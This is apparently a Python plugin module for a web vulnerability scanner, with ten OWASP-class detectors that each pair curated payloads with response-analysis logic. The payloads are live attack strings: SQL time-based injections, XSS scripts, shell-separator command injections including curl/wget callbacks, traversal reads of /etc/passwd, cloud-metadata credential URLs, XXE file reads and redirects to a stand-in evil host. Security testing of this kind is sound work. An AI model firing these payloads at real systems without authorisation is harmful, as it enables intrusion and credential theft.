"""Built-in OWASP-oriented plugins (one vulnerability class each).

Payload variations are curated in the spirit of the PortSwigger Web Security
Academy cheat sheets (not a generic default list). Detection logic for each
plugin compares against the engine baseline/control probes and uses signatures,
reflection-context checks and timing thresholds to keep false positives down.
"""
from __future__ import annotations
import re
from typing import List, Optional

from .base import (Plugin, Case, Finding, ScanEngine, RawResp, sub_marker,
                   rand_token, point_label, FIRM, HIGH, TENTATIVE, INFO,
                   TIMING_THRESHOLD_MS)


# --------------------------------------------------------------------------
# 1) SQL Injection — A03:2021 Injection
# --------------------------------------------------------------------------
SQL_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"pg_query\(\)|pg::|postgresql.*error",
    r"sqlite3?::|sqlite_error|unrecognized token",
    r"ora-\d{5}",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"sqlstate\[",
    r"syntax error at or near",
    r"mysql_fetch_|mysqli_|supplied argument is not a valid mysql",
]


class SQLInjection(Plugin):
    id = "sqli"
    name = "SQL Injection"
    owasp = "A03:2021 Injection"
    description = "Error / boolean / time-based SQL injection."

    def run(self, engine: ScanEngine) -> List[Finding]:
        findings = []
        if "§" not in engine.base_text:
            return findings
        base = engine.base_text

        # --- error-based ---
        for payload in ("'", "\"", "')", "';", "`"):
            if engine.stopped():
                return findings
            req = sub_marker(base, payload)
            resp = engine.send(req)
            engine.progress(f"sqli err {payload!r}", resp)
            sig = self._sql_error(resp, engine)
            if sig:
                findings.append(self._mk(resp, FIRM, f"SQL error surfaced: '{sig}'",
                                         point_label(base), payload, "error-based", req))
                break

        # --- boolean-based (true vs false) ---
        if not engine.stopped():
            true_p = "' AND '1'='1"
            false_p = "' AND '1'='2"
            r_true = engine.send(sub_marker(base, true_p))
            r_false = engine.send(sub_marker(base, false_p))
            engine.progress("sqli boolean pair", r_true)
            if r_true.ok and r_false.ok:
                lt, lf = len(r_true.body), len(r_false.body)
                lb = len(engine.baseline.body) if engine.baseline and engine.baseline.ok else lt
                # true should resemble baseline, false should differ clearly
                diff = abs(lt - lf)
                if diff > 25 and abs(lt - lb) <= max(10, int(0.02 * max(lb, 1))):
                    findings.append(self._mk(
                        r_true, HIGH,
                        f"TRUE vs FALSE responses differ ({lt} vs {lf} bytes); TRUE matches baseline ({lb}).",
                        point_label(base), f"{true_p} / {false_p}", "boolean",
                        sub_marker(base, true_p)))

        # --- time-based ---
        timing_payloads = [
            "' AND SLEEP(5)-- -",
            "'; WAITFOR DELAY '0:0:5'-- -",
            "'||pg_sleep(5)--",
            "' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -",
        ]
        base_ms = engine.baseline.elapsed_ms if engine.baseline else 0
        for payload in timing_payloads:
            if engine.stopped():
                break
            req = sub_marker(base, payload)
            resp = engine.send(req, timing=True)
            engine.progress(f"sqli time {payload[:18]}", resp)
            if resp.ok and (resp.elapsed_ms - base_ms) >= TIMING_THRESHOLD_MS:
                # confirm once to cut FP from a slow endpoint
                confirm = engine.send(req, timing=True)
                if confirm.ok and (confirm.elapsed_ms - base_ms) >= TIMING_THRESHOLD_MS:
                    findings.append(self._mk(
                        resp, FIRM,
                        f"Delayed {resp.elapsed_ms}ms vs baseline {base_ms}ms (confirmed {confirm.elapsed_ms}ms).",
                        point_label(base), payload, "time-based", req))
                    break
        return findings

    def _sql_error(self, resp: RawResp, engine: ScanEngine) -> Optional[str]:
        if not resp.ok:
            return None
        body = resp.body.lower()
        base_body = engine.baseline.body.lower() if engine.baseline and engine.baseline.ok else ""
        for rx in SQL_ERRORS:
            m = re.search(rx, body)
            if m and not re.search(rx, base_body):
                return m.group(0)[:60]
        return None

    def _mk(self, resp, conf, evidence, point, payload, label, req):
        f = Finding(self.id, self.name, self.owasp, conf, point, payload,
                    evidence, label, resp.status, resp.elapsed_ms, req,
                    (resp.raw_head + "\r\n\r\n" + resp.body) if resp.ok else resp.error)
        return f


# --------------------------------------------------------------------------
# 2) Cross-Site Scripting — A03:2021 Injection
# --------------------------------------------------------------------------
class XSS(Plugin):
    id = "xss"
    name = "Cross-Site Scripting (Reflected)"
    owasp = "A03:2021 Injection"
    description = "Reflection of HTML/JS metacharacters without encoding."

    def run(self, engine: ScanEngine) -> List[Finding]:
        findings = []
        if "§" not in engine.base_text:
            return findings
        base = engine.base_text
        token = rand_token(6)
        # Probe carries unique token wrapped in the chars that matter per context.
        probes = [
            (f"{token}<>\"'", "raw metachar probe"),
            (f"\"><svg/onload=alert({token})>", "attribute breakout → svg"),
            (f"<script>alert({token})</script>", "html context → script"),
            (f"'-alert({token})-'", "js string breakout"),
            (f"javascript:alert({token})", "uri context"),
            (f"<img src=x onerror=alert({token})>", "img onerror"),
        ]
        best = None  # (confidence, evidence, payload, label, resp, req)
        for payload, label in probes:
            if engine.stopped():
                break
            req = sub_marker(base, payload)
            resp = engine.send(req)
            engine.progress(f"xss {label}", resp)
            if not resp.ok or token not in resp.body:
                continue
            body = resp.body
            ctype = (resp.header("content-type") or "").lower()
            # 1) exact dangerous sink reflected verbatim -> Firm (HTML context)
            dangerous = any(s in body for s in (
                f"<svg/onload=alert({token})>",
                f"<script>alert({token})</script>",
                f"<img src=x onerror=alert({token})>"))
            if dangerous and "html" in ctype:
                best = (FIRM, f"Payload reflected unencoded in HTML (token {token}).",
                        payload, label, resp, req)
                break
            # 2) raw metachars survived around the token (not entity-encoded)
            if f"{token}<>\"'" in body:
                if best is None:
                    best = (HIGH, f"Metacharacters (<>\"') reflected unencoded around {token}.",
                            payload, label, resp, req)
            # 3) reflected but encoded -> informational, keep looking
            elif token in body and ("&lt;" in body or "&gt;" in body) and best is None:
                best = (INFO, f"Input reflected but HTML-encoded (token {token}).",
                        payload, label, resp, req)
        if best and best[0] != INFO:
            conf, ev, payload, label, resp, req = best
            findings.append(self._mk(resp, conf, ev, point_label(base), payload, label, req))
        return findings

    def _mk(self, resp, conf, evidence, point, payload, label, req):
        return Finding(self.id, self.name, self.owasp, conf, point, payload,
                       evidence, label, resp.status, resp.elapsed_ms, req,
                       resp.raw_head + "\r\n\r\n" + resp.body)


# --------------------------------------------------------------------------
# 3) OS Command Injection — A03:2021 Injection
# --------------------------------------------------------------------------
class CommandInjection(Plugin):
    id = "cmdi"
    name = "OS Command Injection"
    owasp = "A03:2021 Injection"
    description = "Time-based OS command injection across shell separators."

    def run(self, engine: ScanEngine) -> List[Finding]:
        findings = []
        if "§" not in engine.base_text:
            return findings
        base = engine.base_text
        base_ms = engine.baseline.elapsed_ms if engine.baseline else 0
        payloads = [
            "; sleep 5",
            "| sleep 5",
            "|| sleep 5",
            "& sleep 5",
            "&& sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "%0asleep 5",
            "& ping -n 5 127.0.0.1 &",   # windows
        ]
        for payload in payloads:
            if engine.stopped():
                break
            req = sub_marker(base, payload)
            resp = engine.send(req, timing=True)
            engine.progress(f"cmdi {payload[:14]}", resp)
            if resp.ok and (resp.elapsed_ms - base_ms) >= TIMING_THRESHOLD_MS:
                confirm = engine.send(req, timing=True)
                if confirm.ok and (confirm.elapsed_ms - base_ms) >= TIMING_THRESHOLD_MS:
                    findings.append(Finding(
                        self.id, self.name, self.owasp, FIRM, point_label(base),
                        payload, f"Delayed {resp.elapsed_ms}ms vs baseline {base_ms}ms (confirmed).",
                        "time-based", resp.status, resp.elapsed_ms, req,
                        resp.raw_head + "\r\n\r\n" + resp.body))
                    break

        # OAST: blind RCE confirmed by an outbound curl/wget to our listener.
        if engine.oast_available() and not engine.stopped():
            token, url = engine.oast_probe()
            for tpl in (f"; curl {url}", f"| curl {url}", f"`curl {url}`",
                        f"$(curl {url})", f"& curl {url} &", f"; wget -q {url}"):
                if engine.stopped():
                    break
                req = sub_marker(base, tpl)
                resp = engine.send(req)
                engine.progress(f"cmdi oast {tpl[:16]}", resp)
            if engine.oast_confirmed(token, wait=6):
                findings.append(Finding(
                    self.id, self.name, self.owasp, FIRM, point_label(base),
                    f"curl {url}", "Out-of-band callback received — command executed (blind RCE).",
                    "oast", resp.status, resp.elapsed_ms, req,
                    (resp.raw_head + "\r\n\r\n" + resp.body) if resp.ok else resp.error))
        return findings


# --------------------------------------------------------------------------
# 4) Server-Side Template Injection — A03:2021 Injection
# --------------------------------------------------------------------------
class SSTI(Plugin):
    id = "ssti"
    name = "Server-Side Template Injection"
    owasp = "A03:2021 Injection"
    description = "Arithmetic-evaluation probes across template engines."
    # (a, b, expected) so the expected product is unlikely to pre-exist.
    def build_cases(self, base_text, marker):
        a, b = 1337, 7
        expect = str(a * b)
        cases = []
        for tpl in ("{{%d*%d}}", "${%d*%d}", "#{%d*%d}", "<%%= %d*%d %%>",
                    "${{%d*%d}}", "#{%d*%d}", "{{%d*%d}}"):
            p = tpl % (a, b)
            cases.append(Case(label=p, request_text=sub_marker(base_text, p),
                              payload=p, meta={"expect": expect}))
        # Jinja/Twig string multiply signature
        cases.append(Case("{{7*'7'}}", sub_marker(base_text, "{{7*'7'}}"),
                          "{{7*'7'}}", meta={"expect": "7777777"}))
        return cases

    def detect(self, case, resp, engine):
        if not resp.ok:
            return None
        expect = case.meta.get("expect", "")
        base_body = engine.baseline.body if engine.baseline and engine.baseline.ok else ""
        if expect and expect in resp.body and expect not in base_body and case.payload not in resp.body:
            return self._finding(case, resp, FIRM,
                                 f"Template expression evaluated to {expect}.",
                                 point_label(engine.base_text))
        return None


# --------------------------------------------------------------------------
# 5) Path Traversal / LFI — A01:2021 Broken Access Control
# --------------------------------------------------------------------------
class PathTraversal(Plugin):
    id = "lfi"
    name = "Path Traversal / LFI"
    owasp = "A01:2021 Broken Access Control"
    description = "Directory traversal to well-known files with bypass variants."

    def build_cases(self, base_text, marker):
        payloads = [
            "../../../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\\..\\..\\..\\windows\\win.ini",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "php://filter/convert.base64-encode/resource=index.php",
            "/etc/passwd%00",
        ]
        return [Case(p, sub_marker(base_text, p), p) for p in payloads]

    def detect(self, case, resp, engine):
        if not resp.ok:
            return None
        body = resp.body
        if re.search(r"root:.*?:0:0:", body):
            return self._finding(case, resp, FIRM, "Linux /etc/passwd contents returned.",
                                 point_label(engine.base_text))
        if re.search(r"\[(fonts|extensions|mci extensions)\]", body, re.I):
            return self._finding(case, resp, FIRM, "Windows win.ini contents returned.",
                                 point_label(engine.base_text))
        if case.payload.startswith("php://") and re.match(r"^[A-Za-z0-9+/=\r\n]{40,}$", body.strip()[:200] or "x"):
            return self._finding(case, resp, TENTATIVE, "Possible base64 PHP source via php filter.",
                                 point_label(engine.base_text))
        return None


# --------------------------------------------------------------------------
# 6) Server-Side Request Forgery — A10:2021
# --------------------------------------------------------------------------
class SSRF(Plugin):
    id = "ssrf"
    name = "Server-Side Request Forgery"
    owasp = "A10:2021 SSRF"
    description = "Internal/cloud-metadata targets; flags suggestive responses (confirm with OAST)."

    def build_cases(self, base_text, marker):
        payloads = [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://[::1]/",
            "http://2130706433/",                       # decimal 127.0.0.1
            "http://127.0.0.1:22/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://127.1/",
            "file:///etc/passwd",
        ]
        return [Case(p, sub_marker(base_text, p), p) for p in payloads]

    def detect(self, case, resp, engine):
        if not resp.ok:
            return None
        body = resp.body.lower()
        base_body = engine.baseline.body.lower() if engine.baseline and engine.baseline.ok else ""
        sigs = ["ami-id", "instance-id", "security-credentials", "computemetadata",
                "ssh-", "root:x:0:0", "<title>localhost", "metadata"]
        hit = next((s for s in sigs if s in body and s not in base_body), None)
        if hit:
            return self._finding(case, resp, HIGH, f"Response suggests internal fetch (saw '{hit}').",
                                 point_label(engine.base_text))
        # response markedly different from baseline on an internal URL -> worth a look
        if abs(len(resp.body) - len(engine.baseline.body or "")) > 200 and resp.status != engine.baseline.status:
            return self._finding(case, resp, TENTATIVE,
                                 "Internal URL produced a distinct response — confirm with an OAST/Collaborator host.",
                                 point_label(engine.base_text))
        return None

    def run(self, engine):
        findings = super().run(engine)
        # OAST: embed a callback URL; a hit proves the server made the request.
        if engine.oast_available() and "§" in engine.base_text and not engine.stopped():
            token, url = engine.oast_probe()
            req = sub_marker(engine.base_text, url)
            resp = engine.send(req)
            engine.progress(f"ssrf oast {token}", resp)
            if engine.oast_confirmed(token, wait=6):
                findings.append(Finding(
                    self.id, self.name, self.owasp, FIRM, point_label(engine.base_text),
                    url, "Out-of-band callback received — server fetched the attacker URL.",
                    "oast", resp.status, resp.elapsed_ms, req,
                    (resp.raw_head + "\r\n\r\n" + resp.body) if resp.ok else resp.error))
        return findings


# --------------------------------------------------------------------------
# 7) XML External Entity — A05:2021
# --------------------------------------------------------------------------
class XXE(Plugin):
    id = "xxe"
    name = "XML External Entity (XXE)"
    owasp = "A05:2021 Security Misconfiguration"
    description = "External-entity file reads (send on XML-accepting endpoints)."

    def build_cases(self, base_text, marker):
        bodies = [
            ('classic file read',
             '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'),
            ('php filter',
             '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&xxe;</r>'),
            ('parameter entity',
             '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "file:///etc/passwd"> %p;]><r>x</r>'),
        ]
        cases = []
        for label, xml in bodies:
            # Replace the whole body with the XML payload, keep the request line/headers.
            cases.append(Case(label, self._with_body(base_text, xml), xml[:40] + "…"))
        return cases

    def _with_body(self, base_text, xml):
        from ..httptext import split_message
        start, headers, _body = split_message(base_text)
        # force an XML content-type
        headers = [(k, v) for k, v in headers if k.lower() not in ("content-type", "content-length")]
        headers.append(("Content-Type", "application/xml"))
        head = "\r\n".join([start] + [f"{k}: {v}" for k, v in headers])
        return head + "\r\n\r\n" + xml

    def detect(self, case, resp, engine):
        if not resp.ok:
            return None
        if re.search(r"root:.*?:0:0:", resp.body):
            return self._finding(case, resp, FIRM, "File contents (/etc/passwd) returned via entity.",
                                 "(request body)")
        if re.search(r"(doctype|entity).*(not allowed|forbidden)|xml parsing", resp.body, re.I):
            return self._finding(case, resp, TENTATIVE, "XML/entity parsing error — parser processes DTDs.",
                                 "(request body)")
        return None

    def run(self, engine):
        findings = super().run(engine)
        # Blind/OOB XXE: external entity to a callback URL.
        if engine.oast_available() and not engine.stopped():
            token, url = engine.oast_probe()
            xml = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "{url}">]><r>&xxe;</r>')
            req = self._with_body(engine.base_text, xml)
            resp = engine.send(req)
            engine.progress(f"xxe oast {token}", resp)
            if engine.oast_confirmed(token, wait=6):
                findings.append(Finding(
                    self.id, self.name, self.owasp, FIRM, "(request body)",
                    url, "Out-of-band callback received — external entity was resolved (blind XXE).",
                    "oast", resp.status, resp.elapsed_ms, req,
                    (resp.raw_head + "\r\n\r\n" + resp.body) if resp.ok else resp.error))
        return findings


# --------------------------------------------------------------------------
# 8) Open Redirect — A01:2021
# --------------------------------------------------------------------------
class OpenRedirect(Plugin):
    id = "openredirect"
    name = "Open Redirect"
    owasp = "A01:2021 Broken Access Control"
    description = "Redirect-parameter abuse to an external host, with filter bypasses."
    EVIL = "evil-r3d.example"

    def build_cases(self, base_text, marker):
        e = self.EVIL
        payloads = [
            f"https://{e}/",
            f"//{e}/",
            f"/\\{e}/",
            f"https:/{e}/",
            f"https://target%2f@{e}/",
            f"https://{e}%2f%2e%2e",
            f"////{e}/",
            f"https://localhost.{e}/",
            f"\\/\\/{e}/",
        ]
        return [Case(p, sub_marker(base_text, p), p) for p in payloads]

    def detect(self, case, resp, engine):
        if not resp.ok:
            return None
        if resp.status in (301, 302, 303, 307, 308):
            loc = resp.header("location") or ""
            if self.EVIL in loc:
                # make sure the host part, not just a path, points to evil
                after = loc.split("//", 1)[-1]
                host = re.split(r"[/?#]", after, 1)[0]
                conf = FIRM if self.EVIL in host else HIGH
                return self._finding(case, resp, conf,
                                     f"Location header redirects off-site: {loc[:120]}",
                                     point_label(engine.base_text))
        return None


# --------------------------------------------------------------------------
# 9) CRLF / HTTP Header Injection — A03:2021
# --------------------------------------------------------------------------
class CRLFInjection(Plugin):
    id = "crlf"
    name = "CRLF / HTTP Header Injection"
    owasp = "A03:2021 Injection"
    description = "Newline injection that smuggles a header/cookie into the response."

    def __init__(self):
        self.token = rand_token(5)

    def build_cases(self, base_text, marker):
        t = self.token
        injected = f"Set-Cookie: r3dcrlf={t}"
        payloads = [
            f"%0d%0a{injected.replace(' ', '%20')}",
            f"%0aSet-Cookie:%20r3dcrlf={t}",
            f"\r\n{injected}",
            f"%0d%0aX-R3D:%20{t}",
            f"%250d%250aX-R3D:%20{t}",
            f"%E5%98%8A%E5%98%8DX-R3D:%20{t}",   # unicode newline trick
        ]
        return [Case(p, sub_marker(base_text, p), p, meta={"token": t}) for p in payloads]

    def detect(self, case, resp, engine):
        if not resp.ok:
            return None
        t = self.token
        for k, v in resp.headers:
            if ("r3dcrlf" in v and t in v) or (k.lower() == "x-r3d" and t in v) or \
               (k.lower() == "set-cookie" and f"r3dcrlf={t}" in v):
                return self._finding(case, resp, FIRM,
                                     f"Injected response header appeared: {k}: {v[:60]}",
                                     point_label(engine.base_text))
        return None


# --------------------------------------------------------------------------
# 10) CORS Misconfiguration — A05:2021
# --------------------------------------------------------------------------
class CORSMisconfig(Plugin):
    id = "cors"
    name = "CORS Misconfiguration"
    owasp = "A05:2021 Security Misconfiguration"
    description = "Reflects an attacker Origin / trusts null with credentials."
    uses_marker = False
    EVIL = "https://evil-r3d.example"

    def build_cases(self, base_text, marker):
        from ..httptext import split_message
        start, headers, body = split_message(base_text)
        host = ""
        for k, v in headers:
            if k.lower() == "host":
                host = v.strip()
        origins = [
            (self.EVIL, "arbitrary origin"),
            ("null", "null origin"),
            (f"https://{host}.evil-r3d.example", "suffix trust bypass"),
            (f"https://evil-r3d.example{('.' + host) if host else ''}", "prefix/not-escaped-dot"),
        ]
        cases = []
        for origin, label in origins:
            hdrs = [(k, v) for k, v in headers if k.lower() != "origin"]
            hdrs.append(("Origin", origin))
            req = "\r\n".join([start] + [f"{k}: {v}" for k, v in hdrs]) + "\r\n\r\n" + body
            cases.append(Case(label, req, origin, meta={"origin": origin}))
        return cases

    def detect(self, case, resp, engine):
        if not resp.ok:
            return None
        acao = resp.header("access-control-allow-origin")
        acac = (resp.header("access-control-allow-credentials") or "").lower()
        origin = case.meta.get("origin", "")
        if not acao:
            return None
        reflects = (acao.strip() == origin) or (acao.strip() == "*")
        if reflects and origin != "*":
            conf = FIRM if acac == "true" else HIGH
            cred = " with credentials" if acac == "true" else ""
            return self._finding(case, resp, conf,
                                 f"ACAO reflects Origin '{origin}'{cred} (ACAO={acao}, ACAC={acac or 'n/a'}).",
                                 "Origin header")
        if acao.strip() == "*" and acac == "true":
            return self._finding(case, resp, HIGH,
                                 "Wildcard ACAO together with credentials=true.", "Origin header")
        return None


def all_plugins() -> List[Plugin]:
    return [
        SQLInjection(), XSS(), CommandInjection(), SSTI(), PathTraversal(),
        SSRF(), XXE(), OpenRedirect(), CRLFInjection(), CORSMisconfig(),
    ]
